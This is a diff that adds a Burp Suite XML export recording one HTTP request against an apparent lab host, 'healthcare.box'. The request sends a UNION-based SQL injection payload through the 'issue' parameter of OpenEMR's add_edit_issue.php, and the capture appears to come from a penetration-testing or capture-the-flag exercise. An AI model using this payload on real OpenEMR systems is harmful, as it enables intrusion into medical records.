@@ -1,0 +1,42 @@
+<?xml version="1.0"?>
+<!DOCTYPE items [
+<!ELEMENT items (item*)>
+<!ATTLIST items burpVersion CDATA "">
+<!ATTLIST items exportTime CDATA "">
+<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT url (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT port (#PCDATA)>
+<!ELEMENT protocol (#PCDATA)>
+<!ELEMENT method (#PCDATA)>
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT extension (#PCDATA)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT status (#PCDATA)>
+<!ELEMENT responselength (#PCDATA)>
+<!ELEMENT mimetype (#PCDATA)>
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT comment (#PCDATA)>
+]>
+<items burpVersion="2020.9.1" exportTime="Thu Sep 24 13:47:08 CEST 2020">
+  <item>
+    <time>Thu Sep 24 13:46:49 CEST 2020</time>
+    <url><![CDATA[http://healthcare.box/openemr/interface/patient_file/summary/add_edit_issue.php?issue=0+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,user(),25,26,27--]]></url>
+    <host ip="172.16.222.141">healthcare.box</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/openemr/interface/patient_file/summary/add_edit_issue.php?issue=0+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,user(),25,26,27--]]></path>
+    <extension>php</extension>
+    <request base64="true"><![CDATA[R0VUIC9vcGVuZW1yL2ludGVyZmFjZS9wYXRpZW50X2ZpbGUvc3VtbWFyeS9hZGRfZWRpdF9pc3N1ZS5waHA/aXNzdWU9MCt1bmlvbitzZWxlY3QrMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsdXNlcigpLDI1LDI2LDI3LS0gSFRUUC8xLjENCkhvc3Q6IGhlYWx0aGNhcmUuYm94DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjY4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjguMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogT3BlbkVNUj02OTc0OWQxNzYzNTk3MDA0NzczZjc4NmFlNDg0NjIyNg0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=]]></request>
+    <status>302</status>
+    <responselength>419</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzAyIEZvdW5kDQpEYXRlOiBUaHUsIDI0IFNlcCAyMDIwIDEzOjQ2OjQ4IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjE3IChQQ0xpbnV4T1MgMjAxMS9QUkVGT1JLLTFwY2xvczIwMTEpDQpYLVBvd2VyZWQtQnk6IFBIUC81LjMuMw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0wDQpQcmFnbWE6IG5vLWNhY2hlDQpMb2NhdGlvbjogL29wZW5lbXIvaW50ZXJmYWNlL2xvZ2luX3NjcmVlbi5waHA/ZXJyb3I9MSZzaXRlPQ0KQ29udGVudC1MZW5ndGg6IDANCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOA0KDQo=]]></response>
+    <comment></comment>
+  </item>
+</items>
